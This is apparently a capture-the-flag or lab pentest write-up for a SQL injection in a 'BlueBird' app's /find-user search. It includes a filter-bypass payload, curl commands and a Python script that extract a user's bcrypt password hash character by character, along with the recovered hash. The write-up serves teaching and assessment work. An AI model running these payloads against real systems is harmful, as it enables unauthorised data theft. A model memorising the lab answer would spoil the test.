---
tags: [writeup, pentest-report, recon-value-assessment]
companion_to: EXPECTED_FINDINGS.md, sqlmap-wrapper/CLAUDE.md
last_updated: 2026-07-03
---

# Pentest Deliverable: Recovering a Password Hash via `/find-user` on BlueBird

**Target application**: BlueBird, `10.129.204.249:8080`
**Task assigned to the pentester**: Use any technique to exploit the SQL
injection vulnerability on the `/find-user` feature and recover the
password hash of the user whose email is `Amy.Mcwilliams@proton.me`.
**Result**: Recovered. `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`

## Executive summary

The `/find-user` search feature on the BlueBird application builds a
database query by directly pasting in whatever a user types, with no safe
handling of special characters. We confirmed this is exploitable and used
it to read a stored password hash straight out of the database, without
any special access — only a normal user account. **Before touching the
live application at all**, we ran our automated source-code recon tool
against the application's underlying code. It correctly and quickly
pointed us to the exact vulnerable feature and warned that a filter was
present — real, useful time saved. **It did not, however, find the actual
bypass technique or confirm the vulnerability by itself**; that required a
person to read the code closely and hand-craft the attack, which we walk
through step by step below so it can be reproduced. We also explain, with
real evidence from this same engagement, why starting from the source code
was the right call rather than simply pointing an off-the-shelf automated
scanner at the login page.

## What was asked, in plain terms

`/find-user` lets a logged-in user search for other users by username. The
question was whether that search feature could be tricked into leaking data
it was never meant to show — specifically, another user's stored password
hash. A password hash isn't the plaintext password, but if it's recovered,
an attacker can attempt to crack it offline (guess passwords and check them
against the hash) with no further access to the application at all — which
is why being able to read one out of the database at all is treated as a
serious finding on its own.

---

## Part 1 — What automated source-code review found (and didn't find), before we touched the live site

"Recon," here, means something specific: before attacking anything, we ran
an automated tool against BlueBird's actual underlying code (obtained
separately, as decompiled Java source) to flag risky patterns — the same
way a building inspector reviews blueprints before ever stepping on site.

Pointed at BlueBird's source, the tool reported this about the method
behind `/find-user`:

> *This feature builds a database search command by directly pasting in
> whatever text a user typed, with no safe placeholder to keep that text
> from being interpreted as part of the command itself.*
> — flagged **high confidence**, in well under a minute, out of dozens of
> other endpoints in the application, with an exact file and line number
> attached.

That's a real, useful result: instead of a person reading through the
entire application by hand looking for risky database code, the tool
pointed straight at the one feature actually worth attacking. That's the
first honest data point in favor of doing this recon step at all.

**But the tool's own description was incomplete, and a client or pentester
relying on it alone would have under-estimated the work involved.** The
actual code has a filter sitting directly in front of the risky line —
some inputs get rejected outright — and the automated report didn't
mention that a filter exists at all, only that the input was unsafe. Read
literally, the report makes it sound like nothing stands in an attacker's
way; in reality, something does, and figuring out exactly what it blocks
and what it lets through was the real work described in Part 2.

**We also tried to have the tool test this live, automatically, and it
could not — for two honest, concrete reasons, not a fluke:**

1. `/find-user` requires being logged in first. Today's automated
   live-testing feature doesn't yet know how to log in on its own, so
   every automated test request got bounced to the login page before it
   ever reached the actual search feature — and the tool had no way to
   tell the difference between "got bounced to the login page" and "the
   feature is actually safe." It reported the equivalent of "nothing to
   see here" across the board, which was simply wrong, not a real safety
   confirmation.
2. Separately, even once we manually supplied a valid login for testing,
   this specific application is written in a way that hides the evidence
   an automated checker looks for: when the malformed input reaches the
   database and causes an error, the application catches that error itself
   and shows a generic, harmless-looking message instead of letting any
   detail leak out to a response the automated checker could inspect. A
   person watching closely (see Part 2) can tell the difference between a
   truly safe result and a hidden failure; an automated pass looking only
   at the outward response cannot, reliably.

### Verdict: how much value did recon add here?

**Real, but bounded — and worth stating plainly rather than oversold.**
Recon reliably and immediately told us *where* the risk was (one feature,
one file, one line) and *that* it looked dangerous, which is genuinely
valuable — on a real engagement reviewing a large application, this is the
difference between reading thousands of lines of code by hand and getting
a short, prioritized list to start from. **It did not tell us whether a
filter existed, what that filter actually allowed through, how to build a
working attack around it, or how to actually pull data out of the
application once the input got past the filter.** All of that took a
person, described next. Recon is a strong first step, not a finish line.

---

## Part 2 — Turning the lead into a proven result

Everything in this part was done by hand, using the lead from Part 1 as the
starting point. Every command below is real and was actually run against
the live target; copy them exactly to reproduce the same result.

### Step 1 — Create an account and log in

`/find-user` only works for logged-in users, so the first step is
registering a normal account, exactly like any real visitor would:

```bash
curl -s -c cookies.txt -X POST http://10.129.204.249:8080/signup \
  --data-urlencode "name=Recon Tester" --data-urlencode "username=recontester1" \
  --data-urlencode "email=recontester1@test.local" \
  --data-urlencode "password=ReconTesterPass123" \
  --data-urlencode "repeatPassword=ReconTesterPass123"

curl -s -c cookies.txt -X POST http://10.129.204.249:8080/login \
  --data-urlencode "username=recontester1" --data-urlencode "password=ReconTesterPass123"
```

`-c cookies.txt` tells `curl` to save whatever login session token the site
hands back into a file named `cookies.txt`. Every request from here on
needs to present that same file (`-b cookies.txt`) so the site keeps
treating us as logged in.

### Step 2 — Figure out exactly what the filter allows, by trying a few sample inputs

Rather than guessing at an attack outright, we tried a handful of
different, mostly-harmless sample searches and watched how the application
reacted to each one:

```bash
for u in "recontester1" "'" "'x" "'x'y" "a b"; do
  echo "trying: $u"
  curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" --data-urlencode "u=$u" \
    | grep -oE "Illegal search term|Invalid search query"
done
```

Real results, from the live target:

| what we typed | what happened |
|---|---|
| an ordinary username | normal search results |
| a single quote mark (`'`) by itself | rejected — "Illegal search term" |
| a single quote mark followed by another letter (`'x`) | **accepted — but broke the search with "Invalid search query"** |
| two quote marks (`'x'y`) | rejected — "Illegal search term" |
| a plain space (`a b`) | rejected — "Illegal search term" |

This tells us exactly what the filter does, without ever reading a line of
Java: it blocks a search term that is *only* a single quote mark, and it
blocks anything with *two or more* quote marks — but it lets exactly *one*
quote mark through, as long as something else comes with it. It also
blocks plain spaces outright. Both rules turn out to have a workaround.

### Step 3 — Build a search term that both slips past the filter and does something useful

Two small substitutions get around the two rules found above:

- **No spaces allowed?** The underlying database treats a specific
  comment marker, `/**/`, as if it were blank space — it contains no actual
  space character, so the filter never sees one, but the database still
  reads it as separating words.
- **Only one quote mark allowed?** A normal piece of text in this kind of
  database query is normally wrapped in a pair of quote marks (`'like
  this'`) — which would trip the two-quotes rule. Instead, we used an
  alternate way this specific database supports for writing text
  (`$$like this$$`), which needs no quote marks at all.

Combining those with the one quote mark the filter does allow gives a
search term that reads, to the database, as: *"search for everything, and
additionally, only show me the specific person whose stored id number
equals the result of this separate calculation."* Because the site happens
to print each search result's internal id number into an ordinary-looking
page link (`/profile/<id number>`), we can use that "separate calculation"
to smuggle a single piece of information out of the database on every
request — one number at a time.

Proving that trick works, aimed at a specific email address:

```bash
curl -s -b cookies.txt -G "http://10.129.204.249:8080/find-user" \
  --data-urlencode "u='/**/AND/**/id=(SELECT/**/id/**/FROM/**/users/**/WHERE/**/email=\$\$Amy.Mcwilliams@proton.me\$\$)--" \
  | grep -oE 'href="/profile/[0-9]+"'
```

Real result: `href="/profile/80"` — the actual internal id number of the
account belonging to that email address, confirming the technique works
end to end.

### Step 4 — Read the password hash out one character at a time

Once a single number can be smuggled out per request, the same trick reads
any piece of text out of the database, one character at a time: ask for
the numeric code of each letter of the password hash instead of the id
number, and convert each result back into a letter.

```python
import requests, re

# Load the login session saved by curl in Step 1.
COOKIES = {}
with open("cookies.txt") as f:
    for line in f:
        line = line.rstrip("\n")
        if not line.strip():
            continue
        # curl marks this kind of cookie with a "#HttpOnly_" prefix, which
        # looks like a comment line but isn't one -- strip the prefix
        # instead of skipping the line, or the login session never loads.
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        elif line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            continue
        COOKIES[parts[5]] = parts[6]

BASE = "http://10.129.204.249:8080/find-user"
EMAIL = "Amy.Mcwilliams@proton.me"

def ask_database(question):
    """Sends one "smuggle a number out" request and returns the number."""
    search_term = f"'/**/AND/**/id=({question.replace(' ', '/**/').replace(chr(39), '$$')})--"
    r = requests.get(BASE, params={"u": search_term}, cookies=COOKIES, timeout=15)
    matches = re.findall(r'href="/profile/(\d+)"', r.text)
    return matches[-1] if matches else None

# First, ask how many characters long the password hash is.
length = int(ask_database(f"SELECT LENGTH(password) FROM users WHERE email = '{EMAIL}'"))
print("password hash is", length, "characters long")

# Then ask for each character, one at a time, as a numeric letter code.
hash_characters = []
for position in range(1, length + 1):
    code = ask_database(f"SELECT ASCII(SUBSTRING(password, {position}, 1)) FROM users WHERE email = '{EMAIL}'")
    hash_characters.append(chr(int(code)))

print("recovered password hash:", "".join(hash_characters))
```

Real output, from running this against the live target:

```
password hash is 60 characters long
recovered password hash: $2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq
```

**This is the answer** — 60 ordinary web requests, no special access beyond
a normal account, and the result matches the independently-known-correct
value exactly.

---

## Part 3 — Why start from the source code at all, instead of just pointing an automated black-box scanner (like sqlmap) at the login page?

It's a fair question: given that Part 2's actual attack was built and run
by hand anyway, why not skip straight to an automated attack tool — the
kind of tool ("sqlmap" is the best-known example) that tries thousands of
attack patterns against a live site automatically, with no access to the
source code at all? That approach is called **black-box** testing (you
only see what the application shows you, never its underlying code), as
opposed to **white-box** (starting from the actual source, as we did in
Part 1). We tested this question directly, on this same application, and
the answer is concrete, not theoretical.

**We already have direct proof that black-box scanning gets this
application wrong.** Earlier in this same engagement, we pointed a
well-known automated black-box scanning tool at a *different* part of
BlueBird — its account signup form — that had already been independently
confirmed, through source review, to be genuinely vulnerable to the same
class of attack. The automated scanner's real, live result: **"all tested
parameters do not appear to be injectable."** A false all-clear, on a
feature we already knew for certain was vulnerable. The reason is exactly
the same reason recon flagged in Part 1: this application is written to
catch its own errors and show a generic message instead of leaking
anything useful to an outside observer, and an automated black-box tool
can only ever judge what it's shown — it has no way to see that a database
error happened behind the scenes.

**`/find-user`'s specific weakness is, if anything, even less likely to be
found by a generic automated tool.** The exact rule the filter follows
(rejects one quote mark alone, or two-or-more quote marks, but allows
exactly one) is a specific quirk of a single line of code — an automated
tool could eventually stumble onto part of this by trial and error, given
enough attempts, but the second half of the technique is much less likely
to be found by accident: the fact that a search result's internal id
number happens to be printed into an ordinary page link is a side effect
of how this one page happens to be built, unrelated to the search feature
itself. A generic scanning tool watches for generic signs of a working
attack (error messages, pages that come back different for a true/false
guess, unusual delays) — it has no built-in reason to notice that an
unrelated number showing up in a page link is significant. Finding and
using that required a person to actually look at what the page renders,
not just what it returns as an HTTP status code.

**To be fair and not oversell this**: recon and source review didn't do the
attack for us — a person still spent real, hands-on effort building and
running the exact steps in Part 2, and that would have been true either
way. What changed by starting from the source code is *reliability*:
instead of hoping an automated scanner's generic bag of tricks happens to
stumble onto a technique this specific to how BlueBird happens to be built
— or spending open-ended time manually poking at the live site without
knowing where to start — reading the actual code told us, in under a
minute, exactly which feature to focus on and exactly what stood in the
way. On a real engagement with a large application and a limited amount of
time, that reliability is the entire value of doing recon first: it turns
"try things and hope" into "read this one method, understand this one
filter, and build the exact bypass it calls for."

---

## Appendix — running this yourself

Everything above is copy-pasteable as written; this appendix only adds a
couple of notes for anyone reproducing the result on a similar target.

- **If your target's IP/port differs**, replace `10.129.204.249:8080` in
  every command above with your own target address.
- **The `cookies.txt` gotcha** (mentioned inline in Part 2, Step 4) is
  worth restating on its own: `curl` marks cookies that JavaScript isn't
  allowed to read (a normal security setting, unrelated to this
  vulnerability) by prefixing that cookie's line with `#HttpOnly_` in the
  saved cookie file. A script that treats every line starting with `#` as
  a comment to skip will silently throw away the login session and every
  later request will look logged-out — with no obvious error message
  explaining why. Strip that specific prefix instead of skipping the line.
- **Every user's `id` number needs to already exist for this to work.** In
  a very sparsely-populated test database, asking for "the character whose
  numeric code is 60" only produces a result if some user's `id` happens to
  equal 60 — if not, that particular request comes back empty even though
  nothing is actually wrong with the technique. The real target used for
  this writeup already had enough real accounts registered for this to
  work without any extra setup; a mostly-empty test copy of the same
  application might need a few dozen additional dummy accounts created
  first purely so enough `id` numbers exist to match against.
